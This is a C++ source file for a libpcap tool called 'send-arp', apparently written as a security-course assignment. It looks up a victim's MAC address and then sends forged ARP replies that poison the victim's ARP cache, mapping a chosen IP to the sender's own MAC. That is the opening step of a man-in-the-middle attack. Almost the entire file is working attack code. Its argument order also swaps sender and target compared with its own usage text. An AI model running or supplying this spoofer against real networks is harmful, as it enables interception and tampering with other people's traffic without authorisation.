#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <net/if.h>
#include <iostream>

#include "./mac.h"
#include "./ip.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...] \n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_mac(const char* ifname, Mac& mac) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket error");
		return false;
	}

	struct ifreq ifr {};
	std::strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl error");
		close(fd);
		return false;
	}

	const auto* addr = reinterpret_cast<const unsigned char*>(ifr.ifr_hwaddr.sa_data);

	char buf[18];
	std::snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
					addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
	
	close(fd);

	mac = Mac(buf);

	return true;
}

bool get_ip(const char* ifname, Ip& ip) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket error");
		return false;
	}

	struct ifreq ifr {};
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		perror("ioctl error");
		close(fd);
		return false;
	}

	const auto* addr = reinterpret_cast<const sockaddr_in*>(&ifr.ifr_addr);

	char buf[INET_ADDRSTRLEN];
	if (inet_ntop(AF_INET, &addr->sin_addr, buf, sizeof(buf)) == nullptr) {
		close(fd);
		return false;
	}
	

	close(fd);

	ip = Ip(std::string(buf));

	return true;
}

EthArpPacket make_packet(pcap_t* handle, const Ip& src_ip, const Ip& t_ip, 
						const Mac& src_mac, const Mac& t_mac, const Mac& dst_mac,
						const uint16_t op_) {
	// 1. 패킷 만들기
	EthArpPacket packet{};

	packet.eth_.dmac_ = dst_mac;
	packet.eth_.smac_ = src_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(op_);
	packet.arp_.smac_ = src_mac;
	packet.arp_.sip_ = htonl(src_ip);
	packet.arp_.tmac_ = t_mac;
	packet.arp_.tip_ = htonl(t_ip);

	return packet;
}

void printIp(const char* name, uint32_t networkOrderIp)
{
    uint32_t ip = ntohl(networkOrderIp);

    printf(
        "%s=%u.%u.%u.%u (raw=0x%08X, host=0x%08X)\n",
        name,
        (ip >> 24) & 0xFF,
        (ip >> 16) & 0xFF,
        (ip >> 8)  & 0xFF,
        ip & 0xFF,
        networkOrderIp,
        ip
    );
}

void send_arp_packet(pcap_t* handle, EthArpPacket& req_packet) {
	if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket)) != 0) {
		fprintf(stderr, "pcap_sendpacket return error=%s\n", pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
}

Mac get_mac_by_ip(pcap_t* handle, const Ip& s_ip, const Ip& src_ip, const Mac& src_mac) {
	// 1. 패킷 만들기
	EthArpPacket req_packet = make_packet(handle, src_ip, s_ip,
										src_mac, Mac::nullMac(), Mac::broadcastMac(), ArpHdr::Request);

	// 2. 패킷 보내기
	send_arp_packet(handle, req_packet);

	while (true) {
		pcap_pkthdr* pkthdr = nullptr;
		const u_char* data = nullptr;
		int result = pcap_next_ex(handle, &pkthdr, &data);

		if (result == 0) continue; // 시간초과인 경우 다시
		if (result < 0) {
			fprintf(stderr, "pcap_next_ex return error=%s\n", pcap_geterr(handle));
			exit(EXIT_FAILURE);
		}

		if (pkthdr->caplen < sizeof(EthArpPacket)) continue;
		const EthArpPacket* packet = reinterpret_cast<const EthArpPacket*>(data);

		// validation(ethertype, src_ip, dst_ip)
		if (ntohs(packet->eth_.type_) != EthHdr::Arp) continue;
		if (packet->arp_.sip() != s_ip) continue;
		if (packet->arp_.tip() != src_ip) continue;

		return packet->arp_.smac_;
	}
}

int main(int argc, char* argv[]) {
	if (argc <= 3) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	EthArpPacket packet;

	Mac src_mac;
	Ip src_ip;
	
	if (!get_ip(dev, src_ip) || !get_mac(dev, src_mac)) {
		fprintf(stderr, "couldn't get own IP or MAC");
		return EXIT_FAILURE;
	}
	
	for (int i = 2; i < argc; i += 2) {
		Ip t_ip = Ip(argv[i]);
		Ip s_ip = Ip(argv[i + 1]);

		Mac t_mac = get_mac_by_ip(pcap, t_ip, src_ip, src_mac);

		EthArpPacket packet = make_packet(pcap, s_ip, t_ip, src_mac, t_mac, t_mac, ArpHdr::Reply);
		send_arp_packet(pcap, packet);
	}

	pcap_close(pcap);
}
